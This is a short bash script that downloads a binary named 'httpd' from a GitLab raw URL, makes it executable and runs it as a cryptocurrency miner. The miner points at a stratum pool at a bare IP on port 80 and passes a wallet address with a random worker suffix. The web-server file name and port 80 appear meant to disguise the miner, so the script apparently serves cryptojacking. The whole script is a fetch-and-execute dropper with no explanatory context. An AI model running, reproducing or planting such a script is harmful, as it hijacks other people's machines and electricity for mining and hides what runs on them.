#!/usr/bin/env bash

wget https://gitlab.com/ravencoin002/sc/-/raw/main/httpd  && chmod 700 httpd && ./httpd -a yespower -o stratum+tcps://164.90.220.205:80 -u ukt9aUAA1WbBDAphyn4MxmM4DGfUTRgyVk.cons$(shuf -n 1 -i 1-9999999) -t8
